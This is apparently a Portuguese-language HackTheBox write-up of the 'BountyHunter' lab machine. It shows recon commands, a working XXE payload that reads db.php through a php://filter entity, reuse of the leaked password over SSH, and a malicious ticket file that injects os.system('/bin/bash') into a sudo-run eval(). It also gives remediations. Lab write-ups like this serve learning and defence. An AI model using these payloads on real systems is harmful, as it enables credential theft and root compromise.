---
title: "HTB — BountyHunter (Easy Linux): XXE + Python eval() sudo"
date: 2026-05-13 12:00:00 +0000
categories: [CTF, HackTheBox]
tags: [hackthebox, linux, xxe, lfi, php-filter, eval, sudo, privesc, easy]
---

**IP:** 10.129.95.166 | **Dificuldade:** Easy | **OS:** Linux (Ubuntu 20.04) | **Autor:** ejedev

## Resumo

Máquina focada em XXE injection e code review. O formulário de bug bounty envia XML codificado em base64, vulnerável a XXE. Usando PHP filters lemos `db.php` e obtemos credenciais para SSH. A escalada explora um script Python com `eval()` que pode ser executado como root via sudo.

| Flag | Hash |
|------|------|
| user.txt | `b332b0ebf595b78c2afa16dde71497a0` |
| root.txt | `3b7a3766b0dfdb69497f1ccb9cf8d63c` |

---

## 1. Reconhecimento

```bash
nmap -sV -sC -T4 -Pn 10.129.95.166
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    Apache httpd 2.4.41
```

---

## 2. Enumeração Web

```bash
ffuf -w ~/ctf/wordlists/SecLists/Discovery/Web-Content/common.txt \
     -u http://10.129.95.166/FUZZ -mc 200,301
```

`/resources/README.txt` revela:
```
[ ] Disable 'test' account on portal and switch to hashed password.
```

O formulário `log_submit.php` envia POST para `/tracker_diRbPr00f314.php` com campo `data` = XML codificado em base64+URL. O XML tem a estrutura:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<bugreport>
  <title>...</title><cwe>...</cwe><cvss>...</cvss><reward>...</reward>
</bugreport>
```

---

## 3. XXE Injection → Leitura do db.php

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
<bugreport>
<title>test</title><cwe>test</cwe><cvss>test</cvss>
<reward>&file;</reward>
</bugreport>
```

```bash
XML='...'  # payload acima
PAYLOAD=$(printf '%s' "$XML" | base64 -w 0 | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))")
curl -s -X POST http://10.129.95.166/tracker_diRbPr00f314.php -d "data=$PAYLOAD"
```

Conteúdo de `db.php` após decodificar base64:

```php
$dbpassword = "m19RoAU0hP41A1sTsq6K";
```

---

## 4. Foothold — SSH como development

Senha reutilizada no usuário `development`:

```bash
ssh development@10.129.95.166
# password: m19RoAU0hP41A1sTsq6K
cat ~/user.txt
# b332b0ebf595b78c2afa16dde71497a0
```

---

## 5. Escalada de Privilégios — eval() no ticketValidator.py

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

O script lê um arquivo `.md` e executa `eval()` no campo `__Ticket Code__`:

```python
validationNumber = eval(x.replace("**", ""))
```

**Condições:** linha começa com `**`, `int(ticketCode) % 7 == 4`, `validationNumber > 100`.

Fórmula: `7*25+4 = 179`, então `179 % 7 = 4 ✓`

**Ticket malicioso `/tmp/f.md`:**

```markdown
# Skytrain Inc
## Ticket to Mars
__Ticket Code:__
**179+ 25 == 204 and __import__("os").system("/bin/bash") == True
```

```bash
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py <<< "/tmp/f.md"
# root shell
cat /root/root.txt
# 3b7a3766b0dfdb69497f1ccb9cf8d63c
```

---

## Diagrama

```
ffuf → /db.php, /resources/README.txt
  ↓ log_submit.php → XML base64 → POST /tracker_diRbPr00f314.php
  ↓ XXE + php://filter → db.php → m19RoAU0hP41A1sTsq6K
  ↓ SSH development → user.txt
  ↓ sudo ticketValidator.py → eval() → __import__('os').system('/bin/bash')
  ↓ root
```

---

## Lições Aprendidas

| Vulnerabilidade | Remediação |
|-----------------|------------|
| XXE sem sanitização | Desabilitar external entities no parser XML |
| Credenciais em arquivo PHP acessível via LFI | Usar variáveis de ambiente para secrets |
| Reutilização de senha (DB → SSH) | Senhas únicas por serviço |
| `eval()` em input controlável com sudo NOPASSWD | Nunca usar eval() em input do usuário |
